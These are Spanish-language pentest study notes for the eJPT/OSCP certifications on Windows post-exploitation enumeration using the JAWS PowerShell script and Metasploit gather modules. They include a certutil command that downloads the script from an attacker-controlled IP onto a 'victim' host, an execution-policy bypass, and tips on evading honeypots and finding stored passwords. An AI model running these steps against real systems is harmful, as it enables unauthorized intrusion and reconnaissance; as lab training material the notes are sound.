## 🦈 1. JAWS – Just Another Windows (Enumeration) Script
**JAWS** es un script de PowerShell diseñado para ayudar a los pentesters (especialmente en la preparación de certificaciones como eJPT u OSCP) a identificar rápidamente vectores de escalada de privilegios.

- **Proyecto:** [JAWS-GitHub](https://github.com/411Hall/JAWS)
- **Función:** Revisa versiones de software, parches, archivos editables, configuraciones de red y más.

### 🛠️ Uso de JAWS:

0. Descargar el script del repositorio.
1. **Transferencia:** Sube el archivo `jaws-enum.ps1` a la máquina víctima.
	- Meterpreter: `upload jaws-script.ps1`
	- Python: `sudo python3 -m http.server 80`
	- Descargar: `certutil -urlcache -f http://<TU_IP>/jaws-enum.ps1 ruta\destino\jaws-enum.ps1`
2. **Ejecución:** Ejecútalo saltando la política de restricciones y redirigiendo la salida a un archivo `.txt`:
	- `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
3. **Análisis:** Descarga el archivo `JAWS-Enum.txt` a tu Kali o léelo directamente para buscar "misconfigurations".

## 🛡️ 2. Enumeración con Módulos de [[Metasploit#🪟 Post-Explotación en Windows|Metasploit]] (Post-Exploitation)
Si ya tienes una sesión de **Meterpreter**, puedes usar módulos específicos de la categoría `gather` para extraer información detallada de forma silenciosa.

|**Módulo**|**Función**|
|---|---|
|**`post/windows/gather/win_privs`**|Muestra los privilegios del usuario actual (ideal para buscar `SeImpersonate`).|
|**`post/windows/gather/enum_logged_on_users`**|Identifica quién está o ha estado conectado (sesiones activas).|
|**`post/windows/gather/checkvm`**|Detecta si la víctima es una máquina virtual (VMware, VirtualBox, etc.).|
|**`post/windows/gather/enum_applications`**|Lista todo el software instalado y sus versiones.|
|**`post/windows/gather/enum_computers`**|Enumera otros equipos conocidos en la red/dominio.|
|**`post/windows/gather/enum_patches`**|Genera una lista de parches (KBs) instalados para buscar vulnerabilidades de kernel.|
|**`post/windows/gather/enum_shares`**|Busca recursos compartidos en red (SMB) accesibles desde la máquina.|
## 💡 Tips de Uso en el eJPTv2

- **Orden de ejecución:** Primero ejecuta `checkvm`. Si estás en una VM, es posible que el entorno esté "hardening" (reforzado) o que sea un honeypot.
- **Aplicaciones instaladas:** Revisa `enum_applications` en busca de software antiguo o de terceros (como FileZilla, navegadores viejos o gestores de bases de datos) que suelen tener contraseñas en archivos de configuración.
- **No te satures:** JAWS genera mucha información.

#
---
**Navegación:**
- [[5.1 Post-Explotación Windows]]